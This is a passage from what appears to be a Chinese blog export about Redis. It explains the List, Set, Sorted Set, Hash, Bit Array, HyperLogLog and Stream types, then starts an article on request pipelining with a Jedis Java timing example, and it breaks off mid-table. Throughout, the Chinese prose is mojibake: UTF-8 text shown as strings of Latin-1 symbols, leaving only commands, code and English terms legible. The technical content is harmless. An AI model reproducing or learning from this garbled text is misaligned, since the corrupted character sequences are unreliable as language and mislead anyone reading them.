<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çœ‹åˆ°è¿™é‡Œï¼Œå¤§å®¶å¯èƒ½ä¼šç–‘æƒ‘äº†ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ incr&#x2F;get å‘½ä»¤çš„æ—¶å€™ï¼Œæ˜æ˜å°±æ˜¯æ•´å‹çš„æ•°å­—å•Šï¼</span><br><span class="line"></span><br><span class="line">å› ä¸ºRediså¹¶æ²¡æœ‰æ•´æ•°ç±»å‹ï¼Œæ‰€ä»¥ï¼ŒINCRå‘½ä»¤åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šå°†å­—ç¬¦ä¸²è§£æä¸ºä¸€ä¸ªæ•´æ•°ï¼Œè¾¾åˆ°æ•´å‹çš„æ•ˆæœã€‚</span><br></pre></td></tr></table></figure>

<h4 id="List-åˆ—è¡¨"><a href="#List-åˆ—è¡¨" class="headerlink" title="List(åˆ—è¡¨)"></a>List(åˆ—è¡¨)</h4><p>Listæ˜¯å­—ç¬¦ä¸²å…ƒç´ çš„<code>æœ‰åº</code>é›†åˆï¼Œé€šè¿‡<code>é“¾è¡¨</code>å®ç°ï¼ŒæŒ‰ç…§æ’å…¥çš„é¡ºåºæ’åºï¼Œå…ƒç´ <code>å¯é‡å¤</code>ã€‚</p>
<p>é“¾è¡¨ï¼ˆLinked listï¼‰æ˜¯ä¸€ç§çº¿æ€§è¡¨ï¼Œæ˜¯å¾ˆå¸¸è§çš„åŸºç¡€æ•°æ®ç»“æ„ï¼Œåœ¨æ¯ä¸€ä¸ªèŠ‚ç‚¹é‡Œå­˜åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œç”±äºä¸å¿…æŒ‰é¡ºåºå­˜å‚¨ã€‚</p>
<p>æ‰€ä»¥é“¾è¡¨åœ¨æ’å…¥çš„æ—¶å€™å¯ä»¥è¾¾åˆ°O(1)çš„å¤æ‚åº¦ï¼Œæ— è®ºä½ åœ¨ 1ä¸‡ è¿˜æ˜¯ 1åƒä¸‡ çš„åˆ—è¡¨ä¸­ï¼Œåœ¨å…¶ å·¦ä¾§ æˆ– å³ä¾§ æ·»åŠ å…ƒç´ çš„é€Ÿåº¦éƒ½æ˜¯ éå¸¸å¿«çš„ã€ç›¸åŒçš„ã€‚</p>
<p>ä½†æ˜¯è®¿é—®é€Ÿåº¦ä¸æ˜¯é‚£ä¹ˆå¿«äº†ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªèŠ‚ç‚¹æˆ–è€…è®¿é—®ç‰¹å®šç¼–å·çš„èŠ‚ç‚¹åˆ™éœ€è¦O(n)çš„æ—¶é—´ï¼Œç‰¹åˆ«æ˜¯LRANGEå‘½ä»¤ï¼ŒæŸ¥è¯¢æ—¶é—´å¤æ‚åº¦ï¼šO(S+N)ï¼Œ S ä¸ºåç§»é‡ start ï¼Œ N ä¸ºæŒ‡å®šåŒºé—´å†…å…ƒç´ çš„æ•°é‡ï¼Œæ—¶é—´å¤æ‚åº¦ä¸æ‰€è®¿é—®å…ƒç´ çš„ç´¢å¼•é‡æˆæ­£æ¯”ã€‚</p>
<p>å¸¸ç”¨çš„ç›¸å…³å‘½ä»¤ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>LPUSH/RPUSH</td>
<td>å°†ä¸€ä¸ªæ–°å…ƒç´ åˆ°åˆ—è¡¨çš„å·¦ä¾§ï¼ˆå¤´éƒ¨ï¼‰/å³ä¾§ï¼ˆå°¾éƒ¨ï¼‰</td>
</tr>
<tr>
<td>LRANGE</td>
<td>ä»åˆ—è¡¨ä¸­æå–æŒ‡å®šèŒƒå›´çš„å…ƒç´ </td>
</tr>
<tr>
<td>LPOP/RPOP</td>
<td>è¿”å›å¹¶ç§»é™¤åˆ—è¡¨å·¦ä¾§ï¼ˆå¤´éƒ¨ï¼‰/å³ä¾§ï¼ˆå°¾éƒ¨ï¼‰çš„å…ƒç´ </td>
</tr>
<tr>
<td>LTRIM</td>
<td>ä¿®å‰ªæŒ‡å®šèŒƒå›´çš„åˆ—è¡¨ï¼Œè®©åˆ—è¡¨åªä¿ç•™æŒ‡å®šèŒƒå›´çš„å…ƒç´ </td>
</tr>
<tr>
<td>LLEN</td>
<td>è·å–åˆ—è¡¨çš„å…ƒç´ æ•°é‡</td>
</tr>
</tbody></table>
<p>é€‚åˆçš„ä½¿ç”¨çš„åœºæ™¯ï¼š</p>
<ul>
<li>ä½œä¸ºæ¶ˆæ¯é˜Ÿåˆ—</li>
<li>æµè§ˆè¶³è¿¹</li>
</ul>
<h4 id="Set-é›†åˆ"><a href="#Set-é›†åˆ" class="headerlink" title="Set(é›†åˆ)"></a>Set(é›†åˆ)</h4><p>Setæ˜¯å­—ç¬¦ä¸²å…ƒç´ çš„<code>æ— åº</code>é›†åˆï¼Œé€šè¿‡<code>å“ˆå¸Œè¡¨</code>å®ç°ï¼Œå…ƒç´ <code>ä¸å¯é‡å¤</code>ã€‚</p>
<p>å®ƒçš„ æ·»åŠ ã€åˆ é™¤ã€æŸ¥æ‰¾ çš„å¤æ‚åº¦éƒ½æ˜¯ O(1)ã€‚</p>
<p>ä½•ä¸ºå“ˆå¸Œè¡¨ï¼Ÿ</p>
<p>å“ˆå¸Œè¡¨(Hash table)ä¹Ÿè¢«å«åšæ•£åˆ—è¡¨ï¼Œå®ƒé€šè¿‡è®¡ç®—ä¸€ä¸ªé”®å€¼çš„æ˜ å°„å‡½æ•°(æ•£åˆ—å‡½æ•°)ï¼Œå°†é”®ï¼ˆKeyï¼‰æ˜ å°„åˆ°è¡¨ä¸­çš„ä¸€ä¸ªä½ç½®ï¼Œä»è€Œç›´æ¥è®¿é—®æ•°æ®å‚¨å­˜ä½ç½®çš„æ•°æ®ç»“æ„ï¼Œèƒ½å¸¦æ¥æé«˜çš„æŸ¥è¯¢é€Ÿåº¦ã€‚</p>
<p>å“ˆå¸Œç®—æ³•æ˜¯ä¸€ç§æ‘˜è¦ç®—æ³•ï¼Œä¸åŒçš„æ•°æ®äº§ç”Ÿå®šé•¿çš„æ‘˜è¦ï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿç¢°æ’å†²çªï¼Œä¸ºäº†è§£å†³æ•°æ®å†²çªï¼Œä¼šé‡‡ç”¨<code>å•ç‹¬é“¾è¡¨æ³•</code>å°†æ•£åˆ—åˆ°åŒä¸€ä¸ªå­˜å‚¨ä½ç½®çš„æ‰€æœ‰å…ƒç´ ä¿å­˜åœ¨ä¸€ä¸ªé“¾è¡¨ä¸­ã€‚</p>
<h4 id="Sorted-Set-æœ‰åºé›†åˆ"><a href="#Sorted-Set-æœ‰åºé›†åˆ" class="headerlink" title="Sorted Set(æœ‰åºé›†åˆ)"></a>Sorted Set(æœ‰åºé›†åˆ)</h4><p>æœ‰åºé›†åˆå’Œé›†åˆSetçš„ç‰¹æ€§åŸºæœ¬ç›¸åŒï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºå®ƒæ˜¯æœ‰åºçš„ã€‚</p>
<p>æ¯ä¸ªå­—ç¬¦ä¸²å…ƒç´ éƒ½ä¸<code>score</code>è¿™ä¸ªæµ®ç‚¹æ•°å­—å€¼ç›¸å…³è”ã€‚è¿™ä¸ªå€¼å°±æ˜¯å®ƒæ’åºçš„åˆ†å€¼(åˆ†å€¼å¯ä»¥ç›¸åŒ)ï¼Œæ ¹æ®è¿™ä¸ªåˆ†å€¼å®ç°å…ƒç´ çš„å‡åºæˆ–é™åºæ’åˆ—ã€‚</p>
<p>é€‚åˆçš„ä½¿ç”¨çš„åœºæ™¯ï¼š</p>
<ul>
<li>æ’è¡Œæ¦œ</li>
<li>å•†å“æ¨è</li>
</ul>
<h4 id="Hash-å“ˆå¸Œ"><a href="#Hash-å“ˆå¸Œ" class="headerlink" title="Hash(å“ˆå¸Œ)"></a>Hash(å“ˆå¸Œ)</h4><p>Hashæ˜¯ä¸€ä¸ªç”± <code>å­—æ®µ</code> å’Œ <code>å€¼</code> ç»„æˆçš„æ˜ å°„è¡¨ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸ª<code>é”®å€¼å¯¹</code>ï¼Œå­—æ®µå’Œå€¼éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆJavaé‡Œçš„HashMap&lt;String,String&gt;ï¼Œä¸€ä¸ªKeyå¯¹åº”ä¸€ä¸ªHashMapã€‚</p>
<p>ç›¸å¯¹å•ç‹¬ä½¿ç”¨ é”®å€¼å¯¹ ä¿å­˜æ•°æ®è€Œè¨€ï¼Œä½¿ç”¨Hashç±»å‹æ¥å­˜å‚¨ï¼Œæ›´åŠ èŠ‚çœç©ºé—´ã€‚</p>
<p>é€‚åˆçš„ä½¿ç”¨çš„åœºæ™¯ï¼š</p>
<ul>
<li>è´­ç‰©è½¦</li>
<li>å¯¹è±¡å±æ€§ä¿¡æ¯</li>
</ul>
<h4 id="Bit-Array-ä½æ•°ç»„"><a href="#Bit-Array-ä½æ•°ç»„" class="headerlink" title="Bit Array(ä½æ•°ç»„)"></a>Bit Array(ä½æ•°ç»„)</h4><p>Bit Arrayä¸æ˜¯å®é™…çš„æ•°æ®ç±»å‹ï¼Œè€Œæ˜¯åœ¨Stringç±»å‹ä¸Šå®šä¹‰çš„ä¸€ç»„é¢å‘ä½çš„æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥è¯´å®ƒæ˜¯Stringç±»å‹çš„ä¸€ç§æ‰©å±•ã€‚</p>
<p>ç”±äºå­—ç¬¦ä¸²æ˜¯äºŒè¿›åˆ¶å®‰å…¨ï¼Œå¹¶ä¸”æœ€å¤§é•¿åº¦ä¸º512 MBï¼Œå› æ­¤å®ƒä»¬é€‚åˆè®¾ç½®å¤šè¾¾ 2çš„32æ¬¡æ–¹ ä¸ªä¸åŒçš„å­—èŠ‚ã€‚</p>
<p>Bit Arrayå°±æ˜¯ä¸€ä¸ªé•¿åº¦å¯å˜çš„bitæ•°ç»„ï¼Œæ¯ä¸ªä½åªèƒ½å­˜å‚¨0æˆ–1ã€‚</p>
<p>ä½æ“ä½œåˆ†ä¸ºä¸¤ç±»ï¼š</p>
<ul>
<li>1ï¼Œå¯¹å•ä¸ªä½æ“ä½œï¼ŒæŠŠå­—æ®µçš„æŸä¸ªä½è®¾ç½®ä¸º 0æˆ–1</li>
<li>2ï¼Œå¯¹ç»™å®šçš„ä½èŒƒå›´å†…ï¼Œç»Ÿè®¡å…¶è®¾ç½®çš„ä½(0æˆ–1)çš„æ•°é‡</li>
</ul>
<p>æ‰€ä»¥ï¼Œå®ƒçš„æœ€å¤§ä¼˜ç‚¹æ˜¯ï¼šåœ¨å­˜å‚¨ä¿¡æ¯æ—¶å¯ä»¥èŠ‚çœå¤§é‡ç©ºé—´ï¼Œä¾‹å¦‚ï¼Œåœ¨ä»¥å¢é‡ç”¨æˆ·IDè¡¨ç¤ºä¸åŒç”¨æˆ·çš„ç³»ç»Ÿä¸­ï¼Œä»…ä½¿ç”¨512MBå†…å­˜å°±å¯ä»¥è®°ä½40äº¿ç”¨æˆ·çš„ä½ä¿¡æ¯</p>
<p>é€‚åˆçš„ä½¿ç”¨çš„åœºæ™¯ï¼š</p>
<ul>
<li>æ•°æ®å»é‡</li>
</ul>
<h4 id="HyperLogLogs-æ¦‚ç‡æ•°æ®ç»“æ„"><a href="#HyperLogLogs-æ¦‚ç‡æ•°æ®ç»“æ„" class="headerlink" title="HyperLogLogs(æ¦‚ç‡æ•°æ®ç»“æ„)"></a>HyperLogLogs(æ¦‚ç‡æ•°æ®ç»“æ„)</h4><p>HyperLogLogsæ˜¯ä¸€ç§æ¦‚ç‡æ•°æ®ç»“æ„ï¼Œç”¨äºå¯¹å”¯ä¸€å…ƒç´ è¿›è¡Œè®¡æ•°ï¼ˆè¿™é‡ŒæŒ‡é›†åˆçš„åŸºæ•°ï¼‰ï¼Œå®ƒå­˜åœ¨ä¸€å®šè¯¯å·®ï¼Œä½†è¯¯å·®å°äº1ï¼…ã€‚</p>
<p>é€šå¸¸ï¼Œå¯¹å”¯ä¸€å…ƒç´ è¿›è¡Œè®¡æ•°éœ€è¦ä¿å­˜å…ƒç´ æœ¬èº«ï¼Œå¹¶ä½¿ç”¨ä¸è¦è®¡æ•°çš„å…ƒç´ æ•°é‡æˆæ¯”ä¾‹çš„å†…å­˜é‡ã€‚</p>
<p>è€ŒHyperLogLogsåªéœ€æ ¹æ®è¾“å…¥å…ƒç´ æ¥è®¡ç®—åŸºæ•°ï¼Œè€Œä¸ä¼šå‚¨å­˜è¾“å…¥å…ƒç´ æœ¬èº«ï¼Œæ‰€ä»¥ï¼Œæ— è®ºå…ƒç´ çš„æ•°é‡å’Œä½“ç§¯æœ‰å¤šå¤§ï¼Œè®¡ç®—åŸºæ•°æ‰€éœ€çš„å†…å­˜ç©ºé—´éƒ½æ˜¯å›ºå®šä¸å˜çš„ï¼Œå¹¶ä¸”æ˜¯å¾ˆå°ï¼Œæ¯ä¸ªKeyçš„å ç”¨å†…å­˜ä¸ä¼šè¶…è¿‡12KBã€‚</p>
<p>è¿™ä¸ªç‰¹æ€§é€ å°±äº†å®ƒçš„ä»·å€¼ï¼Œå½“ç„¶ä¹Ÿä¸§å¤±äº†è·å–å…ƒç´ çš„èƒ½åŠ›ï¼Œä¸è¿‡è·å–å…ƒç´ çš„èƒ½åŠ›ä¹Ÿä¸éœ€è¦ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸careã€‚</p>
<p>ç›¸å…³å‘½ä»¤ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>è§£é‡Š</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>pfadd</td>
<td>æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ </td>
<td><code>pfadd k a b c </code></td>
</tr>
<tr>
<td>pfcount</td>
<td>è·å–Keyçš„åŸºæ•°ä¼°ç®—å€¼</td>
<td><code>pfcount k</code></td>
</tr>
<tr>
<td>pfmerge</td>
<td>åˆå¹¶å¤šä¸ªKeyåˆ°ä¸€ä¸ªæ–°Keyï¼Œå¦‚ï¼šå°†<code>k1</code>ä¸<code>k2</code>åˆå¹¶åˆ°<code>newk</code></td>
<td><code>pfmerge newk  k1 k2</code></td>
</tr>
</tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">redis0&gt;</span> <span class="string">pfadd</span> <span class="string">k</span> <span class="string">a</span> <span class="string">b</span> <span class="string">c</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="string">redis0&gt;</span> <span class="string">pfadd</span> <span class="string">k</span> <span class="string">c</span> <span class="string">d</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="string">redis0&gt;</span> <span class="string">pfcount</span> <span class="string">k</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>é€‚åˆä½¿ç”¨çš„åœºæ™¯ï¼š</p>
<ul>
<li>è®°å½•ç½‘ç«™è®¿é—®é‡ã€PVã€UVä¹‹ç±»çš„æ•°æ®</li>
</ul>
<h4 id="Stream-æµ"><a href="#Stream-æµ" class="headerlink" title="Stream(æµ)"></a>Stream(æµ)</h4><p>Streamæ˜¯Redis 5.0å¼•å…¥çš„æ–°æ•°æ®ç±»å‹ï¼Œå®ƒå°±åƒæ—¥å¿—æ–‡ä»¶ä¸€æ ·ï¼Œä»…ä»¥è¿½åŠ æ¨¡å¼æ·»åŠ æ•°æ®ã€‚</p>
<p>æµä¸åˆ—è¡¨æ²¡æœ‰å¤ªå¤§ä¸åŒï¼Œåªæ˜¯é™„åŠ çš„APIæ›´å¤æ‚ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ã€‚</p>
<p>å®ƒéå¸¸é€‚åˆä½œä¸ºæ¶ˆæ¯ç³»ç»Ÿæ¥ä½¿ç”¨ï¼Œè™½ç„¶ Redis æœ¬èº«æä¾›äº†å‘å¸ƒè®¢é˜… (pub/sub) æ¥å®ç°æ¶ˆæ¯é˜Ÿåˆ—çš„åŠŸèƒ½ï¼Œä½†æ˜¯ä»¥å‰çš„å‘å¸ƒè®¢é˜…åŠŸèƒ½æ˜¯æœ‰ç¼ºé™·çš„ï¼Œæ¶ˆæ¯æ— æ³•æŒä¹…åŒ–ï¼Œå¦‚æœå‡ºç°ç½‘ç»œæ–­å¼€ã€Rediså®•æœºç­‰ï¼Œæ¶ˆæ¯å°±ä¼šè¢«ä¸¢å¼ƒã€‚</p>
<p>Streamæµçš„å·¥ä½œæ–¹å¼æˆªç„¶ä¸åŒï¼Œæ‰€æœ‰æ¶ˆæ¯éƒ½å°†æ— é™æœŸä¿ç•™åœ¨æµä¸­ï¼Œé™¤éç”¨æˆ·æ˜ç¡®è¦æ±‚åˆ é™¤ï¼Œå¹¶ä¸”ï¼Œä¸°å¯Œçš„APIè¶³ä»¥æ”¯æ’‘æ•´ä¸ªæ¶ˆæ¯ç³»ç»Ÿçš„åŠŸèƒ½ã€‚</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>åˆ†å¸ƒå¼ç¼“å­˜</tag>
        <tag>ç¼“å­˜</tag>
        <tag>nosql</tag>
      </tags>
  </entry>
  <entry>
    <title>Redisä¸“æ -ä½¿ç”¨ç®¡é“åŠ é€Ÿè¯·æ±‚</title>
    <url>/2020/10/01/redis-pipelining/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>å¤§å®¶éƒ½åœ¨è¯´Rediså¾ˆå¿«ï¼æ²¡é”™ï¼éå¸¸å¿«ï¼ä½†ä½ çœŸçš„æ„Ÿå—åˆ°å®ƒçš„å¿«äº†å—ï¼Ÿå°¤å…¶åœ¨é«˜å¹¶å‘æˆ–æå·®ç½‘ç»œç¯å¢ƒçš„æƒ…å†µä¸‹ï¼ŒçœŸçš„å¿«äº†å—ï¼Ÿä½ ç”¨å¯¹äº†å—ï¼Ÿ</p>
<p>åœ¨è®¨è®ºè¿™äº›é—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯<code>RTT</code>ï¼Œä»¥åŠRTTå¸¦æ¥çš„å½±å“ã€‚</p>
<h4 id="ä»€ä¹ˆæ˜¯RTTï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯RTTï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯RTTï¼Ÿ"></a>ä»€ä¹ˆæ˜¯RTTï¼Ÿ</h4><p>ä¸€ä¸ªTCPè¯·æ±‚ç»å†çš„æ­¥éª¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œå¹¶ä»¥é˜»å¡çš„æ–¹å¼ä»å¥—æ¥å­—ä¸­è¯»å–æœåŠ¡å™¨çš„å“åº”ã€‚</span><br><span class="line">2ï¼ŒæœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œå¤„ç†å‘½ä»¤å¹¶å°†å“åº”å‘é€å›å®¢æˆ·ç«¯ã€‚</span><br><span class="line"></span><br><span class="line">æ³¨ï¼šå¥—æ¥å­—æ˜¯é€šä¿¡çš„åŸºçŸ³ï¼Œæ˜¯æ”¯æŒTCP&#x2F;IPåè®®çš„è·¯é€šä¿¡çš„åŸºæœ¬æ“ä½œå•å…ƒã€‚ --æ¥è‡ªç™¾åº¦ç™¾ç§‘</span><br></pre></td></tr></table></figure>
<p>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šè¿‡ç½‘ç»œé“¾æ¥è¿›è¡Œè¿æ¥ï¼Œè¿™æ ·çš„é“¾æ¥å¯èƒ½éå¸¸å¿«ï¼ˆç¯å›æ¥å£ï¼šæœ¬æœºå†…çš„è¯·æ±‚ï¼‰ï¼Œä¹Ÿå¯èƒ½éå¸¸æ…¢ï¼ˆé€šè¿‡ç½‘ç»œè¿æ¥çš„ä¸¤å°ä¸»æœºï¼Œå®ƒä»¬ä¹‹é—´å¯èƒ½å­˜åœ¨å¾ˆå¤šè·ƒç‚¹ï¼‰ã€‚æ— è®ºç½‘ç»œå¿«æ…¢ï¼Œè¯·æ±‚éƒ½ä¼šæœ‰ä¸€æ®µç­‰å¾…æ—¶é—´ï¼ˆå³ï¼šä»å®¢æˆ·ç«¯ä¼ è¾“åˆ°æœåŠ¡å™¨ï¼Œå†ç”±æœåŠ¡å™¨ä¼ è¾“å›å®¢æˆ·ç«¯æ¶ˆè€—çš„æ—¶é—´ï¼‰ï¼Œè¿™æ®µæ—¶é—´ç§°ä¸º <code>RTTï¼ˆè¯·æ±‚å¾€è¿”æ—¶é—´ï¼‰</code>ã€‚</p>
<p>è€ŒRedisçš„é€šè®¯ï¼Œå°±æ˜¯å»ºç«‹åœ¨TCPä¹‹ä¸Šçš„ï¼Œå®ƒå°±æ˜¯å…¸å‹çš„ä½¿ç”¨<code>å®¢æˆ·ç«¯-æœåŠ¡å™¨</code>äº¤äº’æ¨¡å‹è¿›è¡Œè¯·æ±‚å“åº”çš„TCPæœåŠ¡å™¨ï¼Œæ‰€ä»¥<code>RTT</code>ç›´æ¥å½±å“åˆ°å®ƒçš„æ¯ä¸€ä¸ªè¯·æ±‚ã€‚</p>
<p>è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬çš„RedisæœåŠ¡å™¨çš„ RTTæ—¶é—´ ä¸º200æ¯«ç§’ï¼Œé‚£ä¹ˆå³ä½¿æœåŠ¡å™¨æ¯ç§’æœ‰å¤„ç†10ä¸‡ä¸ªè¯·æ±‚çš„èƒ½åŠ›ï¼Œä½†æ˜¯åœ¨è¿™ä¸ªç½‘ç»œç¯å¢ƒä¸‹ï¼Œå®ƒæ¯ç§’æœ€å¤šä¹Ÿåªèƒ½å¤„ç†5ä¸ªè¯·æ±‚ã€‚</p>
<p>é‚£ä¹ˆåˆ°ç°åœ¨ï¼Œä½ è¿˜è®¤ä¸ºå®ƒå¿«å—ï¼Ÿå…ˆåˆ«æ€¥ç€å¦å®šï¼Œè¿™æ¯•ç«Ÿæ˜¯å—åˆ°äº† ç½‘ç»œå› ç´ çš„å½±å“ã€‚ä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹çœ‹ï¼ŒRedisæœ‰ä»€ä¹ˆåŠæ³•åœ¨è¿™æ ·çš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œæå‡è¯·æ±‚é€Ÿåº¦ï¼</p>
<h4 id="Redisç®¡é“"><a href="#Redisç®¡é“" class="headerlink" title="Redisç®¡é“"></a>Redisç®¡é“</h4><p>è§£å†³é—®é¢˜çš„æ€è·¯ï¼Ÿå¯¼è‡´é—®é¢˜çš„æ ¹æºæ˜¯RTTï¼Œæ²¡æœ‰åŠæ³•å¹²é¢„RTTçš„æ—¶å€™ï¼Œå¦‚ä½•åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­å¤„ç†æ›´å¤šçš„å‘½ä»¤å°±æ˜¯å®ƒçš„ä¼˜åŒ–æ–¹å‘ã€‚</p>
<p>è§£å†³è¿™ä¸ªé—®é¢˜çš„æŠ€æœ¯å·²ç»éå¸¸çš„æˆç†Ÿï¼Œä¸šç•Œä¹Ÿæœ‰å¤§é‡æŠ€æœ¯æ­£åœ¨ä½¿ç”¨å®ƒï¼Œå®ƒå°±æ˜¯pipeliningæµæ°´çº¿(ç®¡é“)æŠ€æœ¯ï¼Œå®ƒçš„å‡ºç° æœ‰æ•ˆçš„è§£å†³äº†å•ä¸ªè¯·æ±‚çš„æˆæœ¬é—®é¢˜ï¼ŒRedisä¹Ÿä»å¾ˆæ—©å°±å¼€å§‹æ”¯æŒç®¡é“ä¼ è¾“ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬çœ‹çœ‹ï¼Œå¦‚ä½•åœ¨Redisä¸­ä½¿ç”¨ç®¡é“ã€‚</p>
<h5 id="Redisç®¡é“ç¤ºä¾‹"><a href="#Redisç®¡é“ç¤ºä¾‹" class="headerlink" title="Redisç®¡é“ç¤ºä¾‹"></a>Redisç®¡é“ç¤ºä¾‹</h5><p>å¦‚ä¸‹ç¤ºä¾‹ä½¿ç”¨Jediså®¢æˆ·ç«¯ï¼š</p>
<p>ä»£ç ç¤ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line">        Jedis jedis = <span class="keyword">new</span> Jedis(<span class="string">&quot;k.32e.co&quot;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ™®é€šè°ƒç”¨</span></span><br><span class="line">        <span class="keyword">long</span> t1 = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">500</span> ; i ++)&#123;</span><br><span class="line">            jedis.set(<span class="string">&quot;test:&quot;</span> + i,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Jedisè€—æ—¶ï¼š&quot;</span> + (System.currentTimeMillis() - t1));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡ç®¡é“è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">long</span> t2 = System.currentTimeMillis();</span><br><span class="line">        Pipeline pipeline = jedis.pipelined();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">500</span> ; i ++)&#123;</span><br><span class="line">            pipeline.set(<span class="string">&quot;test2:&quot;</span> + i,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pipeline.sync();</span><br><span class="line">        System.out.println(<span class="string">&quot;Jedis Pipelineè€—æ—¶ï¼š&quot;</span> + (System.currentTimeMillis() - t2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è€—æ—¶è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Jedisè€—æ—¶ï¼š11314</span><br><span class="line">Jedis Pipelineè€—æ—¶ï¼š51</span><br></pre></td></tr></table></figure>
<p>å¦‚ä¸Šç¤ºä¾‹ï¼Œæˆ‘ä»¬çœ‹åˆ° æ­£å¸¸æ‰§è¡Œ å’Œ é€šè¿‡ç®¡é“æ‰§è¡Œ å¤§é‡çš„å‘½ä»¤æ—¶ï¼Œå®ƒä»¬ä¸¤è€…ä¹‹é—´çš„è€—æ—¶æ•´æ•´ç›¸å·®äº†ç™¾å€ä¸æ­¢ã€‚æ‰€ä»¥åœ¨åˆé€‚çš„åœºåˆä¸‹ï¼Œåˆç†ä½¿ç”¨ç®¡é“å‘½ä»¤ èƒ½éå¸¸æœ‰æ•ˆçš„åŠ å¿«Rediså‘½ä»¤å¤„ç†é€Ÿåº¦ï¼Œæœ‰æ•ˆçš„æé«˜ç¨‹åºæ€§èƒ½ã€‚</p>
<p>ä¸è¿‡ï¼Œè™½ç„¶ç®¡é“èƒ½å¤Ÿå¸®æˆ‘ä»¬æ‰¹é‡å¤„ç†å¤§é‡çš„å‘½ä»¤ï¼Œä½†æ˜¯ï¼Œç¾é…’è™½å¥½ï¼Œå¯ä¸è¦è´ªæ¯å“Ÿï¼å› ä¸ºç®¡é“é‡Œçš„å‘½ä»¤åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„æ—¶å€™ï¼Œæ˜¯éœ€è¦åœ¨å†…å­˜ä¸­æ’é˜Ÿæ‰§è¡Œçš„ï¼Œæ‰€ä»¥æœ€å¥½ä¸è¦å¡çš„å¤ªå¤šå“¦ã€‚</p>
<h5 id="ç®¡é“ä¹‹å¤–çš„æ–¹æ³•"><a href="#ç®¡é“ä¹‹å¤–çš„æ–¹æ³•" class="headerlink" title="ç®¡é“ä¹‹å¤–çš„æ–¹æ³•"></a>ç®¡é“ä¹‹å¤–çš„æ–¹æ³•</h5><p>Redisé™¤äº†æ”¯æŒ<code>Pipeline</code>ä¹‹å¤–ï¼Œå®ƒè¿˜æ”¯æŒ<code>Lua</code>è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Luaç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œå°†å¤šä¸ªRediså‘½ä»¤æ”¾åœ¨ä¸€èµ·æ‰§è¡Œï¼Œè¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬è¦å¦‚ä½•é€‰æ‹©å‘¢ï¼Ÿå®ƒä»¬ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬çœ‹çœ‹ä¸‹é¢è¿™ä¸ªè¡¨æ ¼ï¼š</p>
<table>
<thead>
<tr>
<th>ç‰¹æ€§</th>
<th>Pipeline</th>
<th>Lua</th>
</tr>
</thead>
